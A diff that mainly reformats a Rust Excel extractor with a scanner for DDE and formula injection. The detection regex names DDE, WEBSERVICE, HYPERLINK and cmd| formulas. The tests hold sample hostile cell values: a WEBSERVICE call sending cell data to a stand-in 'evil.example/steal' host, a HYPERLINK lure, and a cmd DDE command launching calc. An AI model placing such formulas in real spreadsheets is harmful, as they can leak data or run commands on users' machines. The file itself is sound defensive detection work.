@@ -33,9 +33,7 @@ use std::sync::Arc;
 static DDE_PATTERN: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
 
 fn dde_pattern() -> &'static regex::Regex {
-    DDE_PATTERN.get_or_init(|| {
-        regex::Regex::new(r"(?i)^=(DDE\(|WEBSERVICE\(|HYPERLINK\(|cmd\|)").unwrap()
-    })
+    DDE_PATTERN.get_or_init(|| regex::Regex::new(r"(?i)^=(DDE\(|WEBSERVICE\(|HYPERLINK\(|cmd\|)").unwrap())
 }
 
 /// Classify the formula kind from a matching cell value for the warning message.
@@ -151,8 +149,8 @@ impl ExcelExtractor {
         let mut out = String::with_capacity(name.len() + 8);
 
         for (i, ch) in name.char_indices() {
-            let needs_escape = (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~'))
-                || INLINE_METACHARS.contains(&ch);
+            let needs_escape =
+                (i == 0 && matches!(ch, '#' | '>' | '-' | '*' | '+' | '~')) || INLINE_METACHARS.contains(&ch);
             if needs_escape {
                 out.push('\\');
             }
@@ -751,10 +749,7 @@ mod tests {
 
     fn make_dde_workbook(cell_value: &str) -> ExcelWorkbook {
         // Single sheet "Sheet1" with the given cell at R1C1.
-        make_workbook(vec![make_sheet(
-            "Sheet1",
-            Some(vec![vec![cell_value.to_string()]]),
-        )])
+        make_workbook(vec![make_sheet("Sheet1", Some(vec![vec![cell_value.to_string()]]))])
     }
 
     #[test]
@@ -780,11 +775,7 @@ mod tests {
         let workbook = make_dde_workbook("=WEBSERVICE(\"https://evil.example/steal?data=\"&A1)");
         let warnings = scan_for_dde_warnings(&workbook);
         assert_eq!(warnings.len(), 1);
-        assert!(
-            warnings[0].message.contains("WEBSERVICE"),
-            "{}",
-            warnings[0].message
-        );
+        assert!(warnings[0].message.contains("WEBSERVICE"), "{}", warnings[0].message);
     }
 
     #[test]
@@ -792,11 +783,7 @@ mod tests {
         let workbook = make_dde_workbook("=HYPERLINK(\"https://evil.example\",\"click me\")");
         let warnings = scan_for_dde_warnings(&workbook);
         assert_eq!(warnings.len(), 1);
-        assert!(
-            warnings[0].message.contains("HYPERLINK"),
-            "{}",
-            warnings[0].message
-        );
+        assert!(warnings[0].message.contains("HYPERLINK"), "{}", warnings[0].message);
     }
 
     #[test]
@@ -805,11 +792,7 @@ mod tests {
         let workbook = make_dde_workbook("=cmd|' /c calc'!A0");
         let warnings = scan_for_dde_warnings(&workbook);
         assert_eq!(warnings.len(), 1);
-        assert!(
-            warnings[0].message.contains("ExternalCall"),
-            "{}",
-            warnings[0].message
-        );
+        assert!(warnings[0].message.contains("ExternalCall"), "{}", warnings[0].message);
     }
 
     #[test]
@@ -847,15 +830,14 @@ mod tests {
     #[test]
     fn test_dde_formula_case_insensitive() {
         // Pattern must fire regardless of case.
-        for variant in &["=dde(\"app\",\"t\",\"i\")", "=DdE(\"a\",\"b\",\"c\")", "=webservice(\"x\")"] {
+        for variant in &[
+            "=dde(\"app\",\"t\",\"i\")",
+            "=DdE(\"a\",\"b\",\"c\")",
+            "=webservice(\"x\")",
+        ] {
             let workbook = make_dde_workbook(variant);
             let warnings = scan_for_dde_warnings(&workbook);
-            assert_eq!(
-                warnings.len(),
-                1,
-                "case-insensitive match failed for {:?}",
-                variant
-            );
+            assert_eq!(warnings.len(), 1, "case-insensitive match failed for {:?}", variant);
         }
     }
 
@@ -876,11 +858,7 @@ mod tests {
             .filter(|w| w.source == "excel_dde_scan")
             .collect();
         assert_eq!(dde_warnings.len(), 1, "one DDE warning expected in InternalDocument");
-        assert!(
-            dde_warnings[0].message.contains("DDE"),
-            "{}",
-            dde_warnings[0].message
-        );
+        assert!(dde_warnings[0].message.contains("DDE"), "{}", dde_warnings[0].message);
     }
 
     #[test]
